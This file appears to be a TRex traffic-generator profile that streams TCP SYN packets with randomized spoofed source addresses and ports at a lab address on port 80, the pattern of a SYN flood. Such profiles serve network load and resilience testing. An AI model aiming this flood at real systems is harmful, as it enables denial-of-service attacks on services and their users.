from trex_stl_lib.api import *
import argparse


class STLS1(object):
    """ attack 48.0.0.1 at port 80
    """

    def __init__ (self):
        self.max_pkt_size_l3  =9*1024;

    def create_stream (self):

        # TCP SYN
        base_pkt  = Ether()/IP(dst="48.0.0.1")/TCP(dport=80,flags="S")


        # create an empty program (VM)
        vm = STLVM()

        # define two vars
        vm.var(name = "ip_src", min_value = "16.0.0.0", max_value = "18.0.0.254", size = 4, op = "random")
        vm.var(name = "src_port", min_value = 1025, max_value = 65000, size = 2, op = "random")
        
        # write src IP and fix checksum
        vm.write(fv_name = "ip_src", pkt_offset = "IP.src")
        vm.fix_chksum()
        
        # write TCP source port
        vm.write(fv_name = "src_port", pkt_offset = "TCP.sport")
        
        # create the packet
        pkt = STLPktBuilder(pkt = base_pkt, vm = vm)

        return STLStream(packet = pkt,
                         random_seed = 0x1234,# can be remove. will give the same random value any run
                         mode = STLTXCont())



    def get_streams (self, tunables, **kwargs):
        parser = argparse.ArgumentParser(description='Argparser for {}'.format(os.path.basename(__file__)), 
                                         formatter_class=argparse.ArgumentDefaultsHelpFormatter)

        args = parser.parse_args(tunables)
        # create 1 stream 
        return [ self.create_stream() ]


# dynamic load - used for trex console or simulator
def register():
    return STLS1()



